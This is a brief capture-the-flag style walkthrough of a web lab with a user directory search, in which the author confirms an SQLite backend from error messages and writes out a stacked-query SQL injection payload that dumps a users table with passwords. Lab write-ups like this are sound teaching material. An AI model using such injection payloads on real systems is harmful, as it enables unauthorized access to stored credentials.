# Even More Web Vulnerabilities Walkthrough
We are given another room with a directory search for different users. `/robots.txt` returns nothing here, so that is not important at least.

#### What is the name of the only Orthopedist?

In the search registry, it appears that we cannot search for `Orthopedist`, but only for characters and names. If we assume each person has a first and last name, we can search for a space character, and retrieve each person in the database.

`Tracy Gill`

#### What is the name of the person who has a password of "greyblob"?

I originally thought this was an SQLi vulnerability. I confirmed the usage of SQL by inputting some random SQL text. The registry returned the lines:

```
SQLITE_ERROR: unrecognized token: ""%a"
SQLITE_ERROR: unrecognized token: """
```

Let's try an SQLi. Imagine that the input *is* vulnerable. The query is probably of the form:

```SQL
SELECT * FROM professionals WHERE name = " + q + ";
```

So, let's try to craft a query to bypass this first statement and get some info.

Let's first end the line by appending `1";`

This causes our query to become:

```sql
SELECT * FROM professionals WHERE name = "1";;
```

Now, let's add our own stuff. Append `SELECT * FROM users; --`

Note: here, the `--` is a comment operator. It comments out anything that may follow. Our new query is:

```sql
SELECT * FROM professionals WHERE name = "1"; SELECT * FROM users; --anything else following is commented out
```

We now have full access to this database and can answer the next two questions.

# Conclusion

Web app exploitation is now done. Thank God. This one was harder than other modules.

I cannot believe that SQLi was the solution to the hard level whereas earlier we had to identify a vulnerability with buffer :sob:
